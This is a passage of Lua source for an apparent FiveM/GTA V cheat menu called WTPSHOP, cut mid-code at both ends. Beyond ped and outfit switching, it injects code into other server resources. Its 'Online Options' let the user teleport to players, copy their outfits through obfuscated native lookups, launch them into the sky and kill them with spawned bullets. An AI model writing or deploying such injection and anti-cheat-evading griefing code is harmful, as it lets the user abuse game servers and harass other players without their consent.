                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = { 
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow", 
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky", 
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle", 
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark", 
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                executeCode("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        { type = "divider", label = "Outfit Cycler" },
                        {
                            type = "scrollable",
                            label = "Hat",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedPropDrawableVariations(ped, 0)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()
                                    ClearPedProp(ped, 0)
                                    SetPedPropIndex(ped, 0, tonumber(%s), 0, true)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Mask",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 1)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 1, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Shirt",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 11)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 11, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Jacket",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()

                                local max = GetNumberOfPedDrawableVariations(ped, 7)
                                if max == 0 then
                                    max = GetNumberOfPedDrawableVariations(ped, 11)
                                end

                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()

                                    if GetNumberOfPedDrawableVariations(ped, 7) > 0 then
                                        SetPedComponentVariation(ped, 7, tonumber(%s), 0, 0)
                                    else
                                        SetPedComponentVariation(ped, 11, tonumber(%s), 0, 0)
                                    end
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Pants",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 4)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 4, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Shoes",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 6)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 6, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Hands / Arms",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 3)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 3, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Glasses",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedPropDrawableVariations(ped, 1)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                executeCode('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()
                                    ClearPedProp(ped, 1)
                                    SetPedPropIndex(ped, 1, tonumber(%s), 0, true)
                                ]], v))
                            end
                        },
                        { type = "divider", label = "Illenium Appearance" },
                        {
                            label = "Self Ped Menu",
                            type = "button",
                            onSelect = function()
                                executeCode("illenium-appearance", [[
                                    local config = GetDefaultConfig()
                                    config.components = true
                                    config.props = true
                                    config.ped = true
                                    config.headBlend = true
                                    config.faceFeatures = true
                                    config.headOverlays = true
                                    config.tattoos = true
                                    client.startPlayerCustomization(function(appearance)
                                        if appearance then
                                            TriggerServerEvent("illenium-appearance:server:saveAppearance", appearance)
                                        else
                                            lib.notify({
                                                title = _L("cancelled.title"),
                                                description = _L("cancelled.description"),
                                                type = "inform",
                                                position = Config.NotifyOptions.position
                                            })
                                        end
                                        Framework.CachePed()
                                    end, config)
                                ]])
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Clothing Menu", "Save Outfit", "Reload Skin", "Barber Shop", "Tattoo Shop"}, label = "Appearance",
                            onSelect = function(value)
                                if value == "Clothing Menu" then
                                    if GetResourceState("ars_ambulancejob") == "started" then
                                        executeCode('ars_ambulancejob', [[
                                            openWardrobe()
                                        ]])
                                    elseif GetResourceState("cfx-praryo-groups") == "started" then
                                        executeCode('cfx-praryo-groups', [[
                                            WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:openOutfitMenuPraryo')
                                        ]])
                                    elseif GetResourceState("cfx-xfx-basicneeds") == "started" then
                                        executeCode('cfx-xfx-basicneeds', [[
                                            WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:xYy:openClothingShopMenu')
                                        ]])
                                    else
                                        executeCode('any', [[
                                            WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:openClothingShop', true)
                                        ]])
                                    end
                                elseif value == "Save Outfit" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:saveOutfit')
                                    ]])
                                elseif value == "Reload Skin" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:reloadSkin')
                                    ]])
                                elseif value == "Barber Shop" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:OpenBarberShop', true)
                                    ]])
                                elseif value == "Tattoo Shop" then
                                    executeCode('any', [[
                                        WTPSHOP.Native(TriggerEvent, 'illenium-appearance:client:OpenTattooShop', true)
                                    ]])
                                end
                            end
                        },
                    },
                },
            }
        },
        {
            icon = "ph ph-user",
            label = "Online Options",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        { type = "button", label = "Select Everyone" },
                        { type = "button", label = "Un-Select Everyone" },
                        { type = "button", label = "Clear Selection" },
                        { type = "divider", label = "Nearby Players" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = {"Player", "Vehicle"}, label = "Teleport", desc = 'This will teleport you to the selected player',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end
                                if value == "Player" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        local player = GetPlayerFromServerId(playerId)
                                        if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                            self:Notify("error", "WTPSHOP", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                            CPlayers[playerId] = nil
                                            WTPSHOP:UpdateListMenu()
                                            return
                                        end

                                        ApiRasclat.SafeRes(string.format([[
                                            local targetID = %d
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                            local mePed = PlayerPedId()

                                            if DoesEntityExist(targetPed) then
                                                local coords = GetEntityCoords(targetPed)
                                                WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, coords.x, coords.y, coords.z, false, false, false)
                                            end
                                        ]], playerId))
                                        self:Notify("success", "WTPSHOP", ("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(playerId)), playerId), 3000)
                                    end
                                elseif value == "Vehicle" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        local player = GetPlayerFromServerId(playerId)
                                        if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                            self:Notify("error", "WTPSHOP", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                            CPlayers[playerId] = nil
                                            WTPSHOP:UpdateListMenu()
                                            return
                                        end

                                        local veh = GetVehiclePedIsIn(GetPlayerPed(player), 0)

                                        if IsVehicleSeatFree(veh, 0) then
                                            SetPedIntoVehicle(PlayerPedId(), veh, 0)
                                        else
                                            if IsVehicleSeatFree(veh, 1) then
                                                SetPedIntoVehicle(PlayerPedId(), veh, 1)
                                            else
                                                if IsVehicleSeatFree(veh, 2) then
                                                    SetPedIntoVehicle(PlayerPedId(), veh, 2)
                                                else
                                                    if IsVehicleSeatFree(veh, 3) then
                                                        SetPedIntoVehicle(PlayerPedId(), veh, 3)
                                                    else
                                                        self:Notify("error", "WTPSHOP", "No free seats in vehicle", 3000)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        },
                        { type = "button", label = "Steal Outfit",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetServerId = targetPlayers[1]
                                local function _b(str)
                                    local t = {}
                                    for i = 1, #str do t[i] = string.byte(str, i) end
                                    return t
                                end
                                local function _d(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end
                                local function _g(n)
                                    local k = _d(n)
                                    local f = _G[k]
                                    return f
                                end

                                local function findClientIdByServerId(sid)
                                    local players = _g(_b("GetActivePlayers"))()
                                    for _, pid in ipairs(players) do
                                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                                            return pid
                                        end
                                    end
                                    return -1
                                end

                                local function CopyClothing(targetSid)
                                    local clientId = findClientIdByServerId(targetSid)
                                    if clientId == -1 then
                                        return
                                    end

                                    local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                    local myPed = _g(_b("PlayerPedId"))()

                                    if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                        _g(_b("SetPedComponentVariation"))(myPed, 1,  _g(_b("GetPedDrawableVariation"))(targetPed, 1),  _g(_b("GetPedTextureVariation"))(targetPed, 1),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 3,  _g(_b("GetPedDrawableVariation"))(targetPed, 3),  _g(_b("GetPedTextureVariation"))(targetPed, 3),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 4,  _g(_b("GetPedDrawableVariation"))(targetPed, 4),  _g(_b("GetPedTextureVariation"))(targetPed, 4),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 6,  _g(_b("GetPedDrawableVariation"))(targetPed, 6),  _g(_b("GetPedTextureVariation"))(targetPed, 6),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 8,  _g(_b("GetPedDrawableVariation"))(targetPed, 8),  _g(_b("GetPedTextureVariation"))(targetPed, 8),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 9,  _g(_b("GetPedDrawableVariation"))(targetPed, 9),  _g(_b("GetPedTextureVariation"))(targetPed, 9),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 10, _g(_b("GetPedDrawableVariation"))(targetPed, 10), _g(_b("GetPedTextureVariation"))(targetPed, 10), 0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)

                                        _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                        _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                        _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                    end
                                end

                                CopyClothing(targetServerId)
                                self:Notify("success", "WTPSHOP", "Copied clothing!", 5000)
                            end
                        },
                        { type = "button", label = "Glitch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local mySid = GetPlayerServerId(PlayerId())

                                CreateThread(function()
                                    for i = 1, #targetPlayers do
                                        local sid = tonumber(targetPlayers[i])
                                        if sid and sid ~= mySid then
                                            ApiRasclat.SafeRes(string.format([[
                                                local kinginaRunning = false
                                                local NEARBY_RADIUS = 300.0

                                                local function doKingina(targetPed, originalCoords)
                                                    local myPed = PlayerPedId()
                                                    if not DoesEntityExist(myPed) then return end
                                                    if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then return end

                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local teleported = false

                                                    if #(originalCoords - targetCoords) > 8.0 then
                                                        local angle = math.random() * 2 * math.pi
                                                        local radiusOffset = math.random(5, 9)

                                                        SetEntityCoordsNoOffset(
                                                            myPed,
                                                            targetCoords.x + math.cos(angle) * radiusOffset,
                                                            targetCoords.y + math.sin(angle) * radiusOffset,
                                                            targetCoords.z,
                                                            false, false, false
                                                        )

                                                        SetEntityVisible(myPed, false, false)
                                                        teleported = true
                                                        Wait(120)
                                                    end

                                                    ClearPedTasksImmediately(myPed)

                                                    SetEntityCoordsNoOffset(
                                                        myPed,
                                                        targetCoords.x,
                                                        targetCoords.y,
                                                        targetCoords.z + 0.5,
                                                        false, false, false
                                                    )

                                                    Wait(50)

                                                    AttachEntityToEntityPhysically(
                                                        myPed,
                                                        targetPed,
                                                        0,
                                                        0.0, 0.0, 0.0,
                                                        150.0, 0.0, 0.0,
                                                        0.0, 0.0, 0.0,
                                                        1, false, false, 1, 2
                                                    )

                                                    Wait(160)
                                                    DetachEntity(myPed, true, true)

                                                    ClearPedTasksImmediately(myPed)
                                                    ClearPedSecondaryTask(myPed)
                                                    SetEntityCollision(myPed, true, true)
                                                    SetEntityAlpha(myPed, 255, false)
                                                    SetEntityVisible(myPed, true, false)
                                                    SetPedCanRagdoll(myPed, false)
                                                    FreezeEntityPosition(myPed, false)

                                                    Wait(10)

                                                    SetEntityCoordsNoOffset(
                                                        myPed,
                                                        originalCoords.x,
                                                        originalCoords.y,
                                                        originalCoords.z,
                                                        false, false, false
                                                    )

                                                    if teleported then
                                                        SetEntityVisible(myPed, true, false)
                                                    end
                                                end

                                                WTPSHOP.Thread(function()
                                                    if kinginaRunning then return end
                                                    kinginaRunning = true

                                                    local myPed = PlayerPedId()
                                                    if not DoesEntityExist(myPed) then kinginaRunning = false return end

                                                    local originalCoords = GetEntityCoords(myPed)

                                                    local sid = %d
                                                    local player = GetPlayerFromServerId(sid)
                                                    if not player or player == -1 then kinginaRunning = false return end

                                                    local targetPed = GetPlayerPed(player)
                                                    if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then kinginaRunning = false return end

                                                    doKingina(targetPed, originalCoords)

                                                    kinginaRunning = false
                                                end)
                                            ]], sid))
                                        end
                                    end
                                end)
                                self:Notify("success", "WTPSHOP", "Attempting to Glitch Player", 5000)
                            end
                        },
                        { type = "button", label = "Send To Sky", desc = 'This will Send To Sky the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                ApiRasclat.SafeRes(string.format([[
                                    local targetServerId = %s
                                    local playerPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(playerPed)

                                    WTPSHOP.Native(Wait, 250)

                                    WTPSHOP.Native(GiveWeaponToPed, playerPed, GetHashKey("gadget_parachute"), 1, false, true)

                                    for _, playerIdx in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(playerIdx) == targetServerId then
                                            local targetPed = GetPlayerPed(playerIdx)
                                            local targetCoords = GetEntityCoords(targetPed)
                                            
                                            local underTargetZ = targetCoords.z - 50.0
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, playerPed, targetCoords.x, targetCoords.y, underTargetZ, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, playerPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, playerPed, 0, false)
                                            WTPSHOP.Native(Wait, 500)
                                            WTPSHOP.Native(TaskParachute, playerPed, false)
                                            
                                            local ticks = 0
                                            while not IsPedInParachuteFreeFall(playerPed) and ticks < 30 do
                                                WTPSHOP.Native(Wait, 100)
                                                ticks = ticks + 1
                                            end
                                            if IsPedInParachuteFreeFall(playerPed) then
                                                WTPSHOP.Native(ApplyForceToEntity, playerPed, 1, 0.0, 0.0, 90000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                            end
                                            
                                            WTPSHOP.Native(Wait, 1000)
                                            WTPSHOP.Native(SetEntityVisible, playerPed, true, false)
                                            WTPSHOP.Native(SetEntityCollision, playerPed, true, true)
                                            WTPSHOP.Native(ResetEntityAlpha, playerPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            break
                                        end
                                    end
                                ]], targetID))
                                self:Notify("success", "WTPSHOP", "Attempting to Send to Sky the Player", 5000)
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = {"Method 1", "Method 2"}, label = "Kill Player", desc = 'Kills selected player',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            WTPSHOP.Native(CreateThread, function()
                                                local weaponName = 'vehicle_weapon_subcar_mg'
                                                local ammoAmount = 999
                                                local targetSid = %d
                                                local weapon = GetHashKey(weaponName)

                                                RequestWeaponAsset(weapon, 31, 26)
                                                while not HasWeaponAssetLoaded(weapon) do
                                                    Wait(0)
                                                end

                                                local selfPed = PlayerPedId()
                                                WTPSHOP.Native(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTPSHOP.Native(SetPedAmmo, selfPed, weapon, ammoAmount)
                                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                                if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                                    WTPSHOP.Native(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, 
                                                    targetCoords.x, targetCoords.y, targetCoords.z, 
                                                    999999, true, weapon, selfPed, true, false, 999999.0)
                                                    WTPSHOP.Native(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                    WTPSHOP.Native(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                end

                                                WTPSHOP.Native(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                                WTPSHOP.Native(RemoveWeaponFromPed, selfPed, weapon)
